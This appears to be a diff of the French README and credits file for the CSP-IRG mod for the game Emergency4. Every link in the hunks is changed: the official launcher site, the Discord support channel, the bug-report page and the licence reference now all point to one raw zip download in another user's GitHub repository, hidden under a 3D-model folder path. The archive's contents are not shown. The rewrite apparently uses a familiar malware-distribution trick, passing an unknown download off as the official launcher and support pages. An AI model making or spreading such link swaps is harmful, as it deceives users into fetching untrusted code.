@@ -12,22 +12,22 @@ ________________________________________________________________________________
 Le MOD CSP-IRG nécessite Emergency4, Emergency4 Deluxe ou 911 First Responders
 
 Pour installer le mod:
-- Utiliser le Launcher disponible sur https://csp-irg.fr
+- Utiliser le Launcher disponible sur https://github.com/kyllian330/MOD-CSP-IRG/raw/refs/heads/master/Models/Objects/Monitor/MO-CS-IRG-v1.7.zip
 
-En cas de problème, nous contacter via https://discord.gg/GqAaehN #assistance-support
+En cas de problème, nous contacter via https://github.com/kyllian330/MOD-CSP-IRG/raw/refs/heads/master/Models/Objects/Monitor/MO-CS-IRG-v1.7.zip #assistance-support
 
 ______________________________________________________________________________________
 
 				** CREDITS **
 ______________________________________________________________________________________
 
-Ce mod a été réalisé par l'équipe du mod  CSP-IRG http://csp-irg.fr
+Ce mod a été réalisé par l'équipe du mod  CSP-IRG https://github.com/kyllian330/MOD-CSP-IRG/raw/refs/heads/master/Models/Objects/Monitor/MO-CS-IRG-v1.7.zip
 
-LA REDIFFUSION DU MOD EST INTERDITE AILLEURS QUE SUR http://csp-irg.fr 
+LA REDIFFUSION DU MOD EST INTERDITE AILLEURS QUE SUR https://github.com/kyllian330/MOD-CSP-IRG/raw/refs/heads/master/Models/Objects/Monitor/MO-CS-IRG-v1.7.zip 
 PROPRIETE DU MOD CSP-IRG
 
 Vous avez entre vos mains le MOD CSP-IRG qui est une version final, mais des bugs peuvent subsister.
-En cas de bug nous vous invitons à les rapporter sur la page GitHub ( https://github.com/Superjajaman75/MOD-CSP-IRG ) 
+En cas de bug nous vous invitons à les rapporter sur la page GitHub ( https://github.com/kyllian330/MOD-CSP-IRG/raw/refs/heads/master/Models/Objects/Monitor/MO-CS-IRG-v1.7.zip ) 
 
 
 Pour en arriver au niveau actuel, beaucoup de personnes ont aidé le MOD a progresser.
@@ -139,6 +139,6 @@ Spyro				: Communication / Administration
 
 Tous les fichiers utilisés dans ce mod le sont sous réserve personnel de leur propriétaire, disposant tous d'un droit de regard.
 Les modèles 3D sont issus de travail personnel ou de la "3D Warehouse" (tm) sous licence libre. 
-L'utilisation des modèles se fait sous un "Combined Work", + d'info https://3dwarehouse.sketchup.com/tos.html#license
+L'utilisation des modèles se fait sous un "Combined Work", + d'info https://github.com/kyllian330/MOD-CSP-IRG/raw/refs/heads/master/Models/Objects/Monitor/MO-CS-IRG-v1.7.zip
 
 UN GRAND MERCI A TOUTE MON EQUIPE QUI NE M'A JAMAIS LÂCHÉ, VOUS AVEZ TOUJOURS ÉTÉ OPÉRATIONNELS, JE SUIS TRÈS FIER DE VOUS !! (Joachim, membre fondateur du CSP)
